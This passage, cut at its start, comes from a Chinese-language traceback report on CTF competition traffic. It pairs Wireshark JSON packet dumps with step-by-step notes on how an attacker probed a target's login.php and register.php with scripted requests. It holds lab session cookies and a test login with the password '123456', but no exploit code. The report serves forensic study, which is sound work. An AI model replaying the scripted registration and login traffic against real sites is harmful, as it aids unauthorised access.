"01:01:08:0a:0b:94:f3:d4:75:47:b7:53", "tcp.options_tree": {"tcp.options.nop": "01", "tcp.options.nop_tree": {"tcp.option_kind": "1"}, "tcp.options.timestamp": "08:0a:0b:94:f3:d4:75:47:b7:53", "tcp.options.timestamp_tree": {"tcp.option_kind": "8", "tcp.option_len": "10", "tcp.options.timestamp.tsval": "194311124", "tcp.options.timestamp.tsecr": "1967634259"}}, "Timestamps": {"tcp.time_relative": "1987.537200000", "tcp.time_delta": "0.000359000"}, "tcp.analysis": {"tcp.analysis.initial_rtt": "0.069120000", "tcp.analysis.bytes_in_flight": "489", "tcp.analysis.push_bytes_sent": "477"}, "tcp.payload": "47:45:54:20:2f:6c:6f:67:69:6e:2e:70:68:70:20:48:54:54:50:2f:31:2e:31:0d:0a:48:6f:73:74:3a:20:31:30:2e:30:2e:30:2e:34:0d:0a:55:70:67:72:61:64:65:2d:49:6e:73:65:63:75:72:65:2d:52:65:71:75:65:73:74:73:3a:20:31:0d:0a:55:73:65:72:2d:41:67:65:6e:74:3a:20:4d:6f:7a:69:6c:6c:61:2f:35:2e:30:20:28:57:69:6e:64:6f:77:73:20:4e:54:20:31:30:2e:30:3b:20:57:69:6e:36:34:3b:20:78:36:34:29:20:41:70:70:6c:65:57:65:62:4b:69:74:2f:35:33:37:2e:33:36:20:28:4b:48:54:4d:4c:2c:20:6c:69:6b:65:20:47:65:63:6b:6f:29:20:43:68:72:6f:6d:65:2f:31:31:31:2e:30:2e:35:35:36:33:2e:36:35:20:53:61:66:61:72:69:2f:35:33:37:2e:33:36:0d:0a:41:63:63:65:70:74:3a:20:74:65:78:74:2f:68:74:6d:6c:2c:61:70:70:6c:69:63:61:74:69:6f:6e:2f:78:68:74:6d:6c:2b:78:6d:6c:2c:61:70:70:6c:69:63:61:74:69:6f:6e:2f:78:6d:6c:3b:71:3d:30:2e:39:2c:69:6d:61:67:65:2f:61:76:69:66:2c:69:6d:61:67:65:2f:77:65:62:70:2c:69:6d:61:67:65:2f:61:70:6e:67:2c:2a:2f:2a:3b:71:3d:30:2e:38:2c:61:70:70:6c:69:63:61:74:69:6f:6e:2f:73:69:67:6e:65:64:2d:65:78:63:68:61:6e:67:65:3b:76:3d:62:33:3b:71:3d:30:2e:37:0d:0a:41:63:63:65:70:74:2d:45:6e:63:6f:64:69:6e:67:3a:20:67:7a:69:70:2c:20:64:65:66:6c:61:74:65:0d:0a:41:63:63:65:70:74:2d:4c:61:6e:67:75:61:67:65:3a:20:7a:68:2d:43:4e:2c:7a:68:3b:71:3d:30:2e:39:0d:0a:43:6f:6f:6b:69:65:3a:20:50:48:50:53:45:53:53:49:44:3d:61:33:74:75:68:38:36:74:66:39:6b:73:6e:6a:34:71:6b:31:37:36:6c:76:68:6e:6d:31:0d:0a:43:6f:6e:6e:65:63:74:69:6f:6e:3a:20:63:6c:6f:73:65:0d:0a:0d:0a"}, "http": {"GET /login.php HTTP/1.1\\r\\n": {"_ws.expert": {"http.chat": "", "_ws.expert.message": "GET /login.php HTTP/1.1\\r\\n", "_ws.expert.severity": "2097152", "_ws.expert.group": "33554432"}, "http.request.method": "GET", "http.request.uri": "/login.php", "http.request.version": "HTTP/1.1"}, "http.host": "10.0.0.4", "http.request.line": "Connection: close\r\n", "http.user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36", "http.accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "http.accept_encoding": "gzip, deflate", "http.accept_language": "zh-CN,zh;q=0.9", "http.cookie": "PHPSESSID=a3tuh86tf9ksnj4qk176lvhnm1", "http.cookie_tree": {"http.cookie_pair": "PHPSESSID=a3tuh86tf9ksnj4qk176lvhnm1"}, "http.connection": "close", "\\r\\n": "", "http.request.full_uri": "http://10.0.0.4/login.php", "http.request": "1", "http.request_number": "15123", "http.prev_request_in": "707815", "http.response_in": "707875", "http.next_request_in": "707960"}}}}
```

### 备注 4-2

该IP只有12条和第四题靶机相关的流量数据，从Apr 14, 2023 20:13:26.677514000 中国标准时间到Apr 14, 2023 20:13:31.762965000 中国标准时间，因此无法进行完整攻击溯源。从Apr 14, 2023 20:13:30.513472000 中国标准时间的数据包中可以看出，抓包软件在解包TCP数据的时候报错：Previous segment(s) not captured (common at capture start)，考虑是网络流量抓包不完整导致的。

```
{"_index": "packets-2023-04-14", "_type": "doc", "_score": null, "_source": {"layers": {"frame": {"frame.encap_type": "1", "frame.time": "Apr 14, 2023 20:13:30.513472000 中国标准时间", "frame.offset_shift": "0.000000000", "frame.time_epoch": "1681474410.513472000", "frame.time_delta": "0.000084000", "frame.time_delta_displayed": "0.000084000", "frame.time_relative": "69851.127295000", "frame.number": "708090", "frame.len": "467", "frame.cap_len": "467", "frame.marked": "0", "frame.ignored": "0", "frame.protocols": "eth:ethertype:ip:tcp:http", "frame.coloring_rule.name": "Bad TCP", "frame.coloring_rule.string": "tcp.analysis.flags && !tcp.analysis.window_update && !tcp.analysis.keep_alive && !tcp.analysis.keep_alive_ack"}, "eth": {"eth.dst": "b6:40:78:95:09:fb", "eth.dst_tree": {"eth.dst_resolved": "b6:40:78:95:09:fb", "eth.dst.oui": "11944056", "eth.addr": "b6:40:78:95:09:fb", "eth.addr_resolved": "b6:40:78:95:09:fb", "eth.addr.oui": "11944056", "eth.dst.lg": "1", "eth.lg": "1", "eth.dst.ig": "0", "eth.ig": "0"}, "eth.src": "e2:33:ee:ef:45:42", "eth.src_tree": {"eth.src_resolved": "e2:33:ee:ef:45:42", "eth.src.oui": "14824430", "eth.addr": "e2:33:ee:ef:45:42", "eth.addr_resolved": "e2:33:ee:ef:45:42", "eth.addr.oui": "14824430", "eth.src.lg": "1", "eth.lg": "1", "eth.src.ig": "0", "eth.ig": "0"}, "eth.type": "0x0800"}, "ip": {"ip.version": "4", "ip.hdr_len": "20", "ip.dsfield": "0x00", "ip.dsfield_tree": {"ip.dsfield.dscp": "0", "ip.dsfield.ecn": "0"}, "ip.len": "453", "ip.id": "0x0000", "ip.flags": "0x02", "ip.flags_tree": {"ip.flags.rb": "0", "ip.flags.df": "1", "ip.flags.mf": "0"}, "ip.frag_offset": "0", "ip.ttl": "62", "ip.proto": "6", "ip.checksum": "0xa49d", "ip.checksum.status": "2", "ip.src": "99.999.9.17", "ip.addr": "10.255.128.134", "ip.src_host": "99.999.9.17", "ip.host": "10.255.128.134", "ip.dst": "10.255.128.134", "ip.dst_host": "10.255.128.134"}, "tcp": {"tcp.srcport": "7001", "tcp.dstport": "48304", "tcp.port": "48304", "tcp.stream": "27969", "tcp.completeness": "31", "tcp.len": "401", "tcp.seq": "3273281", "tcp.seq_raw": "4231654518", "tcp.nxtseq": "3273682", "tcp.ack": "2837520", "tcp.ack_raw": "3654470957", "tcp.hdr_len": "32", "tcp.flags": "0x0018", "tcp.flags_tree": {"tcp.flags.res": "0", "tcp.flags.ae": "0", "tcp.flags.cwr": "0", "tcp.flags.ece": "0", "tcp.flags.urg": "0", "tcp.flags.ack": "1", "tcp.flags.push": "1", "tcp.flags.reset": "0", "tcp.flags.syn": "0", "tcp.flags.fin": "0", "tcp.flags.str": "·······AP···"}, "tcp.window_size_value": "2777", "tcp.window_size": "177728", "tcp.window_size_scalefactor": "64", "tcp.checksum": "0xaa81", "tcp.checksum.status": "2", "tcp.urgent_pointer": "0", "tcp.options": "01:01:08:0a:0b:94:fd:bc:75:47:c1:3c", "tcp.options_tree": {"tcp.options.nop": "01", "tcp.options.nop_tree": {"tcp.option_kind": "1"}, "tcp.options.timestamp": "08:0a:0b:94:fd:bc:75:47:c1:3c", "tcp.options.timestamp_tree": {"tcp.option_kind": "8", "tcp.option_len": "10", "tcp.options.timestamp.tsval": "194313660", "tcp.options.timestamp.tsecr": "1967636796"}}, "Timestamps": {"tcp.time_relative": "1990.073071000", "tcp.time_delta": "0.000084000"}, "tcp.analysis": {"tcp.analysis.initial_rtt": "0.069120000", "tcp.analysis.flags": {"_ws.expert": {"tcp.analysis.lost_segment": "", "_ws.expert.message": "Previous segment(s) not captured (common at capture start)", "_ws.expert.severity": "6291456", "_ws.expert.group": "33554432"}}}, "tcp.payload": "47:45:54:20:2f:66:6f:6e:74:73:2f:46:6c:61:74:69:63:6f:6e:2e:77:6f:66:66:20:48:54:54:50:2f:31:2e:31:0d:0a:48:6f:73:74:3a:20:31:30:2e:30:2e:30:2e:34:0d:0a:4f:72:69:67:69:6e:3a:20:68:74:74:70:3a:2f:2f:31:30:2e:30:2e:30:2e:34:0d:0a:55:73:65:72:2d:41:67:65:6e:74:3a:20:4d:6f:7a:69:6c:6c:61:2f:35:2e:30:20:28:57:69:6e:64:6f:77:73:20:4e:54:20:31:30:2e:30:3b:20:57:69:6e:36:34:3b:20:78:36:34:29:20:41:70:70:6c:65:57:65:62:4b:69:74:2f:35:33:37:2e:33:36:20:28:4b:48:54:4d:4c:2c:20:6c:69:6b:65:20:47:65:63:6b:6f:29:20:43:68:72:6f:6d:65:2f:31:31:31:2e:30:2e:35:35:36:33:2e:36:35:20:53:61:66:61:72:69:2f:35:33:37:2e:33:36:0d:0a:41:63:63:65:70:74:3a:20:2a:2f:2a:0d:0a:52:65:66:65:72:65:72:3a:20:68:74:74:70:3a:2f:2f:31:30:2e:30:2e:30:2e:34:2f:73:74:79:6c:65:73:68:65:65:74:73:2f:66:6c:61:74:69:63:6f:6e:2e:63:73:73:0d:0a:41:63:63:65:70:74:2d:45:6e:63:6f:64:69:6e:67:3a:20:67:7a:69:70:2c:20:64:65:66:6c:61:74:65:0d:0a:41:63:63:65:70:74:2d:4c:61:6e:67:75:61:67:65:3a:20:7a:68:2d:43:4e:2c:7a:68:3b:71:3d:30:2e:39:0d:0a:43:6f:6f:6b:69:65:3a:20:50:48:50:53:45:53:53:49:44:3d:61:33:74:75:68:38:36:74:66:39:6b:73:6e:6a:34:71:6b:31:37:36:6c:76:68:6e:6d:31:0d:0a:43:6f:6e:6e:65:63:74:69:6f:6e:3a:20:63:6c:6f:73:65:0d:0a:0d:0a"}, "http": {"GET /fonts/Flaticon.woff HTTP/1.1\\r\\n": {"_ws.expert": {"http.chat": "", "_ws.expert.message": "GET /fonts/Flaticon.woff HTTP/1.1\\r\\n", "_ws.expert.severity": "2097152", "_ws.expert.group": "33554432"}, "http.request.method": "GET", "http.request.uri": "/fonts/Flaticon.woff", "http.request.version": "HTTP/1.1"}, "http.host": "10.0.0.4", "http.request.line": "Connection: close\r\n", "http.user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36", "http.accept": "*/*", "http.referer": "http://10.0.0.4/stylesheets/flaticon.css", "http.accept_encoding": "gzip, deflate", "http.accept_language": "zh-CN,zh;q=0.9", "http.cookie": "PHPSESSID=a3tuh86tf9ksnj4qk176lvhnm1", "http.cookie_tree": {"http.cookie_pair": "PHPSESSID=a3tuh86tf9ksnj4qk176lvhnm1"}, "http.connection": "close", "\\r\\n": "", "http.request.full_uri": "http://10.0.0.4/fonts/Flaticon.woff", "http.request": "1", "http.request_number": "15127", "http.prev_request_in": "707978", "http.response_in": "708100", "http.next_request_in": "708200"}}}}
```

## 25

### 攻击步骤 4-1

（准备动作）从Apr 22, 2023 15:17:58.578553000 中国标准时间开始，攻击者访问了目标靶机。在Apr 22, 2023 15:17:58.578553000 中国标准时间到Apr 22, 2023 15:35:35.448829000 中国标准时间之间，攻击者只是访问了几次根目录和login.php。

### 攻击步骤 4-2

（准备动作）随后，在Apr 22, 2023 15:35:52.744191000 中国标准时间，攻击者发现了register.php，但并没有进行注册。在Apr 22, 2023 15:38:16.233629000 中国标准时间，攻击者突然POST /login.php尝试登录网站，网络流量中没有附带账号信息。

```
{"_index": "packets-2023-04-22", "_type": "doc", "_score": null, "_source": {"layers": {"frame": {"frame.encap_type": "1", "frame.time": "Apr 22, 2023 15:38:16.233629000 中国标准时间", "frame.offset_shift": "0.000000000", "frame.time_epoch": "1682149096.233629000", "frame.time_delta": "0.000161000", "frame.time_delta_displayed": "0.000161000", "frame.time_relative": "91870.606432000", "frame.number": "1722351", "frame.len": "101", "frame.cap_len": "101", "frame.marked": "0", "frame.ignored": "0", "frame.protocols": "eth:ethertype:ip:tcp:http:urlencoded-form", "frame.coloring_rule.name": "HTTP", "frame.coloring_rule.string": "http || tcp.port == 80 || http2"}, "eth": {"eth.dst": "ba:31:7f:1e:19:45", "eth.dst_tree": {"eth.dst_resolved": "ba:31:7f:1e:19:45", "eth.dst.oui": "12202367", "eth.addr": "ba:31:7f:1e:19:45", "eth.addr_resolved": "ba:31:7f:1e:19:45", "eth.addr.oui": "12202367", "eth.dst.lg": "1", "eth.lg": "1", "eth.dst.ig": "0", "eth.ig": "0"}, "eth.src": "e2:33:ee:ef:45:42", "eth.src_tree": {"eth.src_resolved": "e2:33:ee:ef:45:42", "eth.src.oui": "14824430", "eth.addr": "e2:33:ee:ef:45:42", "eth.addr_resolved": "e2:33:ee:ef:45:42", "eth.addr.oui": "14824430", "eth.src.lg": "1", "eth.lg": "1", "eth.src.ig": "0", "eth.ig": "0"}, "eth.type": "0x0800"}, "ip": {"ip.version": "4", "ip.hdr_len": "20", "ip.dsfield": "0x00", "ip.dsfield_tree": {"ip.dsfield.dscp": "0", "ip.dsfield.ecn": "0"}, "ip.len": "87", "ip.id": "0x0000", "ip.flags": "0x02", "ip.flags_tree": {"ip.flags.rb": "0", "ip.flags.df": "1", "ip.flags.mf": "0"}, "ip.frag_offset": "0", "ip.ttl": "62", "ip.proto": "6", "ip.checksum": "0x7cb6", "ip.checksum.status": "2", "ip.src": "99.999.9.25", "ip.addr": "10.255.169.209", "ip.src_host": "99.999.9.25", "ip.host": "10.255.169.209", "ip.dst": "10.255.169.209", "ip.dst_host": "10.255.169.209"}, "tcp": {"tcp.srcport": "7001", "tcp.dstport": "43286", "tcp.port": "43286", "tcp.stream": "39028", "tcp.completeness": "31", "tcp.len": "35", "tcp.seq": "7835", "tcp.seq_raw": "5144729", "tcp.nxtseq": "7870", "tcp.ack": "10238", "tcp.ack_raw": "846155550", "tcp.hdr_len": "32", "tcp.flags": "0x0018", "tcp.flags_tree": {"tcp.flags.res": "0", "tcp.flags.ae": "0", "tcp.flags.cwr": "0", "tcp.flags.ece": "0", "tcp.flags.urg": "0", "tcp.flags.ack": "1", "tcp.flags.push": "1", "tcp.flags.reset": "0", "tcp.flags.syn": "0", "tcp.flags.fin": "0", "tcp.flags.str": "·······AP···"}, "tcp.window_size_value": "2048", "tcp.window_size": "131072", "tcp.window_size_scalefactor": "64", "tcp.checksum": "0x5f35", "tcp.checksum.status": "2", "tcp.urgent_pointer": "0", "tcp.options": "01:01:08:0a:7b:fe:e7:47:a8:78:46:7b", "tcp.options_tree": {"tcp.options.nop": "01", "tcp.options.nop_tree": {"tcp.option_kind": "1"}, "tcp.options.timestamp": "08:0a:7b:fe:e7:47:a8:78:46:7b", "tcp.options.timestamp_tree": {"tcp.option_kind": "8", "tcp.option_len": "10", "tcp.options.timestamp.tsval": "2080302919", "tcp.options.timestamp.tsecr": "2826454651"}}, "Timestamps": {"tcp.time_relative": "446.668128000", "tcp.time_delta": "0.000161000"}, "tcp.analysis": {"tcp.analysis.initial_rtt": "0.129933000", "tcp.analysis.bytes_in_flight": "315", "tcp.analysis.push_bytes_sent": "35"}, "tcp.payload": "65:6d:61:69:6c:3d:61:62:63:30:25:34:30:71:71:2e:63:6f:6d:26:70:61:73:73:77:6f:72:64:3d:31:32:33:34:35:36", "tcp.segment_data": "73:77:6f:72:64:3d:31:32:33:34:35:36", "tcp.reassembled_in": "1722361"}, "tcp.segments": {"tcp.segment": "1722351", "tcp.segment.count": "3", "tcp.reassembled.length": "303", "tcp.reassembled.data": "50:4f:53:54:20:2f:6c:6f:67:69:6e:2e:70:68:70:20:48:54:54:50:2f:31:2e:31:0d:0a:48:6f:73:74:3a:20:31:30:2e:30:2e:30:2e:34:0d:0a:55:73:65:72:2d:41:67:65:6e:74:3a:20:70:79:74:68:6f:6e:2d:72:65:71:75:65:73:74:73:2f:32:2e:32:38:2e:31:0d:0a:41:63:63:65:70:74:2d:45:6e:63:6f:64:69:6e:67:3a:20:67:7a:69:70:2c:20:64:65:66:6c:61:74:65:2c:20:62:72:0d:0a:41:63:63:65:70:74:3a:20:2a:2f:2a:0d:0a:43:6f:6e:6e:65:63:74:69:6f:6e:3a:20:6b:65:65:70:2d:61:6c:69:76:65:0d:0a:43:6f:6f:6b:69:65:3a:20:50:48:50:53:45:53:53:49:44:3d:72:63:72:61:36:68:62:33:32:71:32:6f:6e:30:63:76:74:76:31:38:34:70:75:34:72:35:0d:0a:43:6f:6e:74:65:6e:74:2d:4c:65:6e:67:74:68:3a:20:33:35:0d:0a:43:6f:6e:74:65:6e:74:2d:54:79:70:65:3a:20:61:70:70:6c:69:63:61:74:69:6f:6e:2f:78:2d:77:77:77:2d:66:6f:72:6d:2d:75:72:6c:65:6e:63:6f:64:65:64:0d:0a:0d:0a:00:00:00:00:00:00:00:27:00:00:00:23:65:6d:61:69:6c:3d:61:62:63:30:25:34:30:71:71:2e:63:6f:6d:26:70:61:73"}, "http": {"POST /login.php HTTP/1.1\\r\\n": {"_ws.expert": {"http.chat": "", "_ws.expert.message": "POST /login.php HTTP/1.1\\r\\n", "_ws.expert.severity": "2097152", "_ws.expert.group": "33554432"}, "http.request.method": "POST", "http.request.uri": "/login.php", "http.request.version": "HTTP/1.1"}, "http.host": "10.0.0.4", "http.request.line": "Content-Type: application/x-www-form-urlencoded\r\n", "http.user_agent": "python-requests/2.28.1", "http.accept_encoding": "gzip, deflate, br", "http.accept": "*/*", "http.connection": "keep-alive", "http.cookie": "PHPSESSID=rcra6hb32q2on0cvtv184pu4r5", "http.cookie_tree": {"http.cookie_pair": "PHPSESSID=rcra6hb32q2on0cvtv184pu4r5"}, "http.content_length_header": "35", "http.content_length_header_tree": {"http.content_length": "35"}, "http.content_type": "application/x-www-form-urlencoded", "\\r\\n": "", "http.request.full_uri": "http://10.0.0.4/login.php", "http.request": "1", "http.request_number": "9", "http.response_in": "1722356", "http.file_data": ""}, "urlencoded-form": {"Form item": ""}}}}
```

奇怪的是，目标靶机返回的是302 Found，并跳转到了/index.php。攻击者在之前没有注册、且登录没有附带任何账号信息的情况下竟然登录成功了？考虑可能是因为抓包不完整，导致账号信息丢失了。

```
{"_index": "packets-2023-04-22", "_type": "doc", "_score": null, "_source": {"layers": {"frame": {"frame.encap_type": "1", "frame.time": "Apr 22, 2023 15:38:16.236363000 中国标准时间", "frame.offset_shift": "0.000000000", "frame.time_epoch": "1682149096.236363000", "frame.time_delta": "0.000223000", "frame.time_delta_displayed": "0.000223000", "frame.time_relative": "91870.609166000", "frame.number": "1722356", "frame.len": "975", "frame.cap_len": "975", "frame.marked": "0", "frame.ignored": "0", "frame.protocols": "eth:ethertype:ip:tcp:http:data-text-lines", "frame.coloring_rule.name": "HTTP", "frame.coloring_rule.string": "http || tcp.port == 80 || http2"}, "eth": {"eth.dst": "e2:33:ee:ef:45:42", "eth.dst_tree": {"eth.dst_resolved": "e2:33:ee:ef:45:42", "eth.dst.oui": "14824430", "eth.addr": "e2:33:ee:ef:45:42", "eth.addr_resolved": "e2:33:ee:ef:45:42", "eth.addr.oui": "14824430", "eth.dst.lg": "1", "eth.lg": "1", "eth.dst.ig": "0", "eth.ig": "0"}, "eth.src": "ba:31:7f:1e:19:45", "eth.src_tree": {"eth.src_resolved": "ba:31:7f:1e:19:45", "eth.src.oui": "12202367", "eth.addr": "ba:31:7f:1e:19:45", "eth.addr_resolved": "ba:31:7f:1e:19:45", "eth.addr.oui": "12202367", "eth.src.lg": "1", "eth.lg": "1", "eth.src.ig": "0", "eth.ig": "0"}, "eth.type": "0x0800"}, "ip": {"ip.version": "4", "ip.hdr_len": "20", "ip.dsfield": "0x00", "ip.dsfield_tree": {"ip.dsfield.dscp": "0", "ip.dsfield.ecn": "0"}, "ip.len": "961", "ip.id": "0x3f07", "ip.flags": "0x02", "ip.flags_tree": {"ip.flags.rb": "0", "ip.flags.df": "1", "ip.flags.mf": "0"}, "ip.frag_offset": "0", "ip.ttl": "64", "ip.proto": "6", "ip.checksum": "0x3845", "ip.checksum.status": "2", "ip.src": "10.255.169.209", "ip.addr": "99.999.9.25", "ip.src_host": "10.255.169.209", "ip.host": "99.999.9.25", "ip.dst": "99.999.9.25", "ip.dst_host": "99.999.9.25"}, "tcp": {"tcp.srcport": "43286", "tcp.dstport": "7001", "tcp.port": "7001", "tcp.stream": "39028", "tcp.completeness": "31", "tcp.len": "909", "tcp.seq": "10250", "tcp.seq_raw": "846155562", "tcp.nxtseq": "11159", "tcp.ack": "7870", "tcp.ack_raw": "5144764", "tcp.hdr_len": "32", "tcp.flags": "0x0018", "tcp.flags_tree": {"tcp.flags.res": "0", "tcp.flags.ae": "0", "tcp.flags.cwr": "0", "tcp.flags.ece": "0", "tcp.flags.urg": "0", "tcp.flags.ack": "1", "tcp.flags.push": "1", "tcp.flags.reset": "0", "tcp.flags.syn": "0", "tcp.flags.fin": "0", "tcp.flags.str": "·······AP···"}, "tcp.window_size_value": "501", "tcp.window_size": "64128", "tcp.window_size_scalefactor": "128", "tcp.checksum": "0xc39e", "tcp.checksum.status": "2", "tcp.urgent_pointer": "0", "tcp.options": "01:01:08:0a:a8:78:46:c6:7b:fe:e7:47", "tcp.options_tree": {"tcp.options.nop": "01", "tcp.options.nop_tree": {"tcp.option_kind": "1"}, "tcp.options.timestamp": "08:0a:a8:78:46:c6:7b:fe:e7:47", "tcp.options.timestamp_tree": {"tcp.option_kind": "8", "tcp.option_len": "10", "tcp.options.timestamp.tsval": "2826454726", "tcp.options.timestamp.tsecr": "2080302919"}}, "Timestamps": {"tcp.time_relative": "446.670862000", "tcp.time_delta": "0.000223000"}, "tcp.analysis": {"tcp.analysis.initial_rtt": "0.129933000", "tcp.analysis.bytes_in_flight": "921", "tcp.analysis.push_bytes_sent": "909"}, "tcp.payload": "48:54:54:50:2f:31:2e:31:20:33:30:32:20:46:6f:75:6e:64:0d:0a:44:61:74:65:3a:20:53:61:74:2c:20:32:32:20:41:70:72:20:32:30:32:33:20:30:37:3a:33:38:3a:31:36:20:47:4d:54:0d:0a:53:65:72:76:65:72:3a:20:41:70:61:63:68:65:2f:32:2e:34:2e:37:20:28:55:62:75:6e:74:75:29:0d:0a:58:2d:50:6f:77:65:72:65:64:2d:42:79:3a:20:50:48:50:2f:35:2e:35:2e:39:2d:31:75:62:75:6e:74:75:34:2e:32:39:0d:0a:45:78:70:69:72:65:73:3a:20:54:68:75:2c:20:31:39:20:4e:6f:76:20:31:39:38:31:20:30:38:3a:35:32:3a:30:30:20:47:4d:54:0d:0a:43:61:63:68:65:2d:43:6f:6e:74:72:6f:6c:3a:20:6e:6f:2d:73:74:6f:72:65:2c:20:6e:6f:2d:63:61:63:68:65:2c:20:6d:75:73:74:2d:72:65:76:61:6c:69:64:61:74:65:2c:20:70:6f:73:74:2d:63:68:65:63:6b:3d:30:2c:20:70:72:65:2d:63:68:65:63:6b:3d:30:0d:0a:50:72:61:67:6d:61:3a:20:6e:6f:2d:63:61:63:68:65:0d:0a:4c:6f:63:61:74:69:6f:6e:3a:20:69:6e:64:65:78:2e:70:68:70:0d:0a:43:6f:6e:74:65:6e:74:2d:4c:65:6e:67:74:68:3a:20:35:32:33:0d:0a:4b:65:65:70:2d:41:6c:69:76:65:3a:20:74:69:6d:65:6f:75:74:3d:35:2c:20:6d:61:78:3d:39:38:0d:0a:43:6f:6e:6e:65:63:74:69:6f:6e:3a:20:4b:65:65:70:2d:41:6c:69:76:65:0d:0a:43:6f:6e:74:65:6e:74:2d:54:79:70:65:3a:20:74:65:78:74:2f:68:74:6d:6c:0d:0a:0d:0a:3c:21:44:4f:43:54:59:50:45:20:68:74:6d:6c:3e:0a:3c:68:74:6d:6c:3e:0a:3c:68:65:61:64:3e:0a:09:3c:6d:65:74:61:20:68:74:74:70:2d:65:71:75:69:76:3d:22:43:6f:6e:74:65:6e:74:2d:54:79:70:65:22:20:63:6f:6e:74:65:6e:74:3d:22:74:65:78:74:2f:68:74:6d:6c:3b:20:63:68:61:72:73:65:74:3d:75:74:66:2d:38:22:3e:0a:09:3c:74:69:74:6c:65:3e:43:54:46:3c:2f:74:69:74:6c:65:3e:0a:09:3c:6d:65:74:61:20:6e:61:6d:65:3d:22:61:70:70:6c:65:2d:6d:6f:62:69:6c:65:2d:77:65:62:2d:61:70:70:2d:63:61:70:61:62:6c:65:22:20:63:6f:6e:74:65:6e:74:3d:22:79:65:73:22:3e:0a:09:3c:6d:65:74:61:20:6e:61:6d:65:3d:22:76:69:65:77:70:6f:72:74:22:20:63:6f:6e:74:65:6e:74:3d:22:77:69:64:74:68:3d:64:65:76:69:63:65:2d:77:69:64:74:68:2c:68:65:69:67:68:74:3d:64:65:76:69:63:65:2d:68:65:69:67:68:74:2c:69:6e:69:74:69:61:6c:2d:73:63:61:6c:65:3d:31:2e:30:2c:6d:69:6e:69:6d:75:6d:2d:73:63:61:6c:65:3d:31:2e:30:2c:6d:61:78:69:6d:75:6d:2d:73:63:61:6c:65:3d:31:2e:30:2c:75:73:65:72:2d:73:63:61:6c:61:62:6c:65:3d:6e:6f:22:20:2f:3e:0a:09:3c:6d:65:74:61:20:6e:61:6d:65:3d:22:66:6f:72:6d:61:74:2d:64:65:74:65:63:74:69:6f:6e:22:20:63:6f:6e:74:65:6e:74:3d:22:74:65:6c:65:70:68:6f:6e:65:3d:6e:6f:2c:20:65:6d:61:69:6c:3d:6e:6f:22:3e:0a:09:3c:6c:69:6e:6b:20:72:65:6c:3d:22:73:74:79:6c:65:73:68:65:65:74:22:20:68:72:65:66:3d:22:2e:2f:73:74:79:6c:65:73:68:65:65:74:73:2f:66:6c:61:74:69:63:6f:6e:2e:63:73:73:22:20:2f:3e:0a:09:3c:6c:69:6e:6b:20:72:65:6c:3d:27:73:74:79:6c:65:73:68:65:65:74:27:20:68:72:65:66:3d:27:2e:2f:73:74:79:6c:65:73:68:65:65:74:73:2f:73:74:79:6c:65:2e:63:73:73:27:20:2f:3e:0a:3c:2f:68:65:61:64:3e:0a:3c:62:6f:64:79:3e:0a"}, "http": {"HTTP/1.1 302 Found\\r\\n": {"_ws.expert": {"http.chat": "", "_ws.expert.message": "HTTP/1.1 302 Found\\r\\n", "_ws.expert.severity": "2097152", "_ws.expert.group": "33554432"}, "http.response.version": "HTTP/1.1", "http.response.code": "302", "http.response.code.desc": "Found", "http.response.phrase": "Found"}, "http.date": "Sat, 22 Apr 2023 07:38:16 GMT", "http.response.line": "Content-Type: text/html\r\n", "http.server": "Apache/2.4.7 (Ubuntu)", "http.cache_control": "no-store, no-cache, must-revalidate, post-check=0, pre-check=0", "http.location": "index.php", "http.content_length_header": "523", "http.content_length_header_tree": {"http.content_length": "523"}, "http.connection": "Keep-Alive", "http.content_type": "text/html", "\\r\\n": "", "http.response": "1", "http.response_number": "9", "http.time": "0.002734000", "http.prev_response_in": "1722345", "http.request_in": "1722351", "http.next_response_in": "1722364", "http.response_for.uri": "http://10.0.0.4/login.php", "http.file_data": "<!DOCTYPE html>\n<html>\n<head>\n\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">\n\t<title>CTF</title>\n\t<meta name=\"apple-mobile-web-app-capable\" content=\"yes\">\n\t<meta name=\"viewport\" content=\"width=device-width,height=device-height,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no\" />\n\t<meta name=\"format-detection\" content=\"telephone=no, email=no\">\n\t<link rel=\"stylesheet\" href=\"./stylesheets/flaticon.css\" />\n\t<link rel='stylesheet' href='./stylesheets/style.css' />\n</head>\n<body>\n"}, "data-text-lines": {"<!DOCTYPE html>\\n": "", "<html>\\n": "", "<head>\\n": "", "\\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">\\n": "", "\\t<title>CTF</title>\\n": "", "\\t<meta name=\"apple-mobile-web-app-capable\" content=\"yes\">\\n": "", "\\t<meta name=\"viewport\" content=\"width=device-width,height=device-height,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no\" />\\n": "", "\\t<meta name=\"format-detection\" content=\"telephone=no, email=no\">\\n": "", "\\t<link rel=\"stylesheet\" href=\"./stylesheets/flaticon.css\" />\\n": "", "\\t<link rel='stylesheet' href='./stylesheets/style.css' />\\n": "", "</head>\\n": "", "<body>\\n": ""}}}}
```

### 攻击步骤 4-3

（成功动作）接下来，在Apr 22, 2023 15:38:16.314845000 中国标准时间到Apr 22, 2023 15:40:53.457420000 中国标准时间之间，攻击者访问靶机的模式非常规律。每次POST /register.php（没有附带账号信息），服务器返回302 Found提示注册成功，然后攻击者POST /login.php（没有附带账号信息）登录网站，然后服务器302跳转至/index.php。

```
